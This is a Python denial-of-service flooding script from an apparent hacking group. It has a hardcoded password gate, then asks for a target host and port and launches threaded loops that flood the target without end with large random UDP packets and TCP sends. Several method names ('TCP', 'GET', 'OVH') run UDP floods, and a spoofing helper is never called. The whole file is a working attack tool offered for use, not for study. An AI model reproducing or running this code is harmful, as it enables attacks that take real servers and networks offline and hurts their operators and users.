#ZieLx
#Jangan Di Ambil Kontol
#King Community
import random
import socket
import threading
import time
import os,sys
import random, socket, threading
import os
import getpass

os.system("clear")
print("""\033[96m
 _  _  ____  _  _  ___ 
( )/ )(_  _)( \( )/ __)
 )  (  _)(_  )  (( (_-.
(_)\_)(____)(_)\_)\___/
""")
password ="king"

for i in range(4):
	pwd = input("\033[97m[•] Enter Password : ")
	j=3
	if(pwd==password):
		time.sleep(3)
		print("\033[97m[•] Correct...")
		break
	else:
		time.sleep(5)
		print("\033[91m[×] Wrong Password : ")
		continue
time.sleep(6)
print("\033[92m[•] Login Authorized ")
time.sleep(2)
os.system("clear")


print("""\033[93m

 _  _  ____  _  _  ___ 
( )/ )(_  _)( \( )/ __)
 )  (  _)(_  )  (( (_-.
(_)\_)(____)(_)\_)\___/

  """)

print("\033[91m===================================")  
print("""\033[95m>>> Code By :\033[91m ZieLx
\033[95m>>> Community : \033[91mKing
\033[95m>>> Methods :\033[91m UDP | TCP | GET | OVH""")
print("\033[91m===================================\n")
ip = str(input("\033[96mHost/Ip \033[36m=====> \033[97m: \033[31m"))
port = int(input("\033[96mPort \033[36m=====> \033[97m: \033[31m"))
choice = str(input("\033[96mMethods \033[36m=====> \033[97m: \033[31m"))
times = int(input("\033[96mConnections \033[36m=====> \033[97m: \033[31m"))
threads = int(input("\033[96mThreads \033[36m=====> \033[97m: \033[31m"))
def run():
	data = random._urandom(65534)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[97m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[97m{}".format(ip,port))
			
def run2():
	data = random._urandom(818)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[97m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[97m{}".format(ip,port))
			
def run3():
	data = random._urandom(818)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[97m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[97m{}".format(ip,port))
			
def run4():
	data = random._urandom(17)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[97m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[97m{}".format(ip,port))
			
def run5():
	data = random._urandom(1872637)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[97m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[97m{}".format(ip,port))

def run6():
	data = random._urandom(146734)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[97m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[97m{}".format(ip,port))

def run7():
    data = random._urandom(818)
    i = random.choice(("[•]","[•]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[97m{}".format(ip,port))
        except:
            s.close()
            print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[97m{}".format(ip,port))

def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled

for y in range(threads):
	if choice == 'UDP':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
	if choice == 'udp':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
	if choice == 'TCP':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
	if choice == 'tcp':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
	if choice == 'GET':
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
	if choice == 'get':
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
	if choice == 'OVH':
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
	if choice == 'ovh':
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
else:
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
		th = threading.Thread(target = run6)
		th.start()
		th = threading.Thread(target = run7)